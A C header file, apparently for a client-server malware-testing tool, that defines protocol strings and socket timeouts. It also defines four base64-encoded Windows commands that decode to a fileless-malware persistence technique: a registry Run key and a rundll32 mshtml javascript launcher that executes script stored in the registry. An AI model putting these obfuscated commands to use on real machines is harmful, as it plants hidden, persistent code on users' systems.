#ifndef HEADERS_H_INCLUDED
#define HEADERS_H_INCLUDED

#define INITIAL 99
#define YES 1
#define NO 0
#define TRUE 1
#define FALSE 0
#define SUCCESS 1
#define FAILURE 0
#define MODIFIED 2
#define BUSY 2
#define LOGSIZE 1000
#define KEEPALIVE_TIMEOUT 10
#define SOCKET_TIMEOUT_RECV 10
#define SOCKET_TIMEOUT_SEND 10

#define CLIENT_REGISTER "CLIENT_REGISTER"
#define CLIENT_IP_RES "CLIENT_IP"
#define SERVER_IP_REQ "CLIENT_REQUEST"
#define SERVER_IP_REQ_MSG "Get_IP_Port"
#define SERVER_IP_REQ_DONE "CLIENT_REQUEST_DONE"
#define SERVER_IP_REQ_COMPLETED "CLIENT_REQUEST_CLOSED"

#define MALWARE_TEST "MALWARE_TEST"
//#define MALWARE_TEST_REQ "MALWARE_TEST_REQ"
//#define GET_MALWARE_PROCESS "GET_MALWARE_PROCESS"
#define NOT_AVAILABLE "NOT_AVAILABLE"
#define AVAILABLE "AVAILABLE"
#define INVALID_REQUEST "INVALID_REQUEST"

#define FILELESS_COMMAND "UkVHIEFERCBIS0NVXHNvZnR3YXJlXG1pY3Jvc29mdFx3aW5kb3dzXGN1cnJlbnR2ZXJzaW9uXHJ1blwgL2YgL3ZlIC90IFJFR19TWiAvZCAicnVuZGxsMzIuZXhlIGphdmFzY3JpcHQ6XCJcLi5cbXNodG1sLFJ1bkhUTUxBcHBsaWNhdGlvbiBcIjtkb2N1bWVudC53cml0ZShcIlw3NHNjcmlwdCBsYW5ndWFnZT1qc2NyaXB0LmVuY29kZV4+XCIrKG5ldyUyMEFjdGl2ZVhPYmplY3QoXCJXU2NyaXB0LlNoZWxsXCIpKS5SZWdSZWFkKFwiSEtDVVxcc29mdHdhcmVcXG1pY3Jvc29mdFxcd2luZG93c1xcY3VycmVudHZlcnNpb25cXHJ1blxcXFxcIikrXCJcNzQvc2NyaXB0Xj5cIiki"
#define DBT_COMMAND "cnVuZGxsMzIuZXhlIGphdmFzY3JpcHQ6XCJcLi5cbXNodG1sLFJ1bkhUTUxBcHBsaWNhdGlvbiBcIjtkb2N1bWVudC53cml0ZShcIlw3NHNjcmlwdCBsYW5ndWFnZT1qc2NyaXB0LmVuY29kZV4+XCIrKG5ldyUyMEFjdGl2ZVhPYmplY3QoXCJXU2NyaXB0LlNoZWxsXCIpKS5SZWdSZWFkKFwiSEtDVVxcc29mdHdhcmVcXG1pY3Jvc29mdFxcd2luZG93c1xcY3VycmVudHZlcnNpb25cXHJ1blxcXFxcIikrXCJcNzQvc2NyaXB0Xj5cIik="
#define FILELESS_COMMAND_STARTUP "cnVuZGxsMzIuZXhlIGphdmFzY3JpcHQ6IlwuLlxtc2h0bWwsUnVuSFRNTEFwcGxpY2F0aW9uICI7ZG9jdW1lbnQud3JpdGUoIlw3NDFzY3JpcHQgbGFuZ3VhZ2U9anNjcmlwdC5lbmNvZGUxPiIrKG5ldyUyMEFjdGl2ZVhPYmplY3QoIldTY3JpcHQuU2hlbGwiKSkuUmVnUmVhZCgiSEtDVVxcc29mdHdhcmVcXG1pY3Jvc29mdFxcd2luZG93c1xcY3VycmVudHZlcnNpb25cXHJ1blxcIikrIlw3NDEvc2NyaXB0PiIp"
#define DOCUMENT_SCRIPTS_COMMAND "cnVuZGxsMzIuZXhlIGphdmFzY3JpcHQ6IlwuLlxtc2h0bWwsUnVuSFRNTEFwcGxpY2F0aW9uICI7ZG9jdW1lbnQud3JpdGUoIlw3NDFzY3JpcHQgbGFuZ3VhZ2U9anNjcmlwdC5lbmNvZGUxPiIrKG5ldyUyMEFjdGl2ZVhPYmplY3QoIldTY3JpcHQuU2hlbGwiKSkuUmVnUmVhZCgiSEtDVVxcc29mdHdhcmVcXG1pY3Jvc29mdFxcd2luZG93c1xcY3VycmVudHZlcnNpb25cXHJ1blxcIikrIlw3NDEvc2NyaXB0PiIp"


char *logdata;


//Builtin Header files
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <pthread.h>
#include <errno.h>

#include <sys/ipc.h>
#include <sys/shm.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/fcntl.h>

pthread_mutex_t lock;

//Custom Header files(Low Level)
#include "logging.h"
#include "mtcQueue.h"
#include "packetProtocol.h"
#include "ServerSocket.h"

//Custom Header files(Med Level)
#include "mtc.h"
#include "mir.h"
#include "KeepaliveProcess.h"
#include "ServerProcess.h"


#endif // HEADERS_H_INCLUDED
